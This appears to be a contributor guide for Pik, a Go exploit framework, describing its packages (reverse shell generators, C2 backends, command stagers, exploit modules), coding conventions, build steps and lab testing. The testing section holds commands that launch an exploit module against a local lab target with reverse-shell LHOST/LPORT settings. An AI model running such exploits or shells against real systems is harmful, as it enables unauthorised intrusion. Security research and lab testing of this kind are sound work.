# Pik Framework

Go exploit framework. Types live in `sdk/`, internal packages import `sdk` directly.

## Architecture

```
sdk/              Source of truth for types, interfaces, constants
pkg/cli/          CLI commands + standalone runner (registers via sdk.SetRunner)
pkg/console/      Interactive REPL with session management
pkg/runner/       Execution engine (single target + scanner)
pkg/c2/           C2 backends (shell listener, sliver, session manager)
pkg/http/         HTTP client with TARGETURI, connection pooling
pkg/payload/      Reverse shell generators + encoding
pkg/cmdstager/    Chunked command delivery
modules/          Exploit modules (import only sdk)
cmd/pik/          Main binary entry point
```

## Key patterns

- Types and interfaces are in `sdk/`. No re-export layer, no code generation.
- `sdk.Run()` uses late binding: `pkg/cli` registers the runner via `sdk.SetRunner()` in its `init()`.
- Standalone binaries need two imports: `sdk` + `_ "github.com/Chocapikk/pik/pkg/cli"`.
- Option enrichers (`RegisterEnricher`) auto-inject LHOST, LPORT, TARGETURI, C2, etc.
- HTTP client auto-prefixes request paths with TARGETURI via `NormalizeURI`.
- Module paths are relative (e.g. `"install.php"` not `"/install.php"`).
- Session manager in `pkg/c2/session/` handles multi-session on one listener.

## Go conventions

- Receivers: single letter OK (`(s *Session)`, `(m *Manager)`)
- Loop vars: `i`, `j`, `k`, `v` OK in `for`/`range`
- Everything else: descriptive names (`mod` not `m`, `params` not `p`, `backend` not `b`)
- No single-letter vars in non-trivial code

## Build

```bash
make build                          # dev build
make build VERSION=1.0.0            # versioned build
make test                           # run tests
```

Version injected via: `-ldflags "-X github.com/Chocapikk/pik/pkg/cli.Version=..."`.

## Testing exploits

Lab containers expected to be running (`docker ps`). Test both modes:

```bash
# Framework mode
go run ./cmd/pik run opendcim -t http://127.0.0.1:18091 -s LHOST=<ip> -s LPORT=4444

# Standalone mode (from opendcim-standalone/)
./opendcim -t http://127.0.0.1:18091 --lhost <ip> --lport 4444
```

## Commit style

Conventional format: `Feat:`, `Fix:`, `Refactor:`, `Docs:`, `Test:`, `Perf:`. No Co-Authored-By.
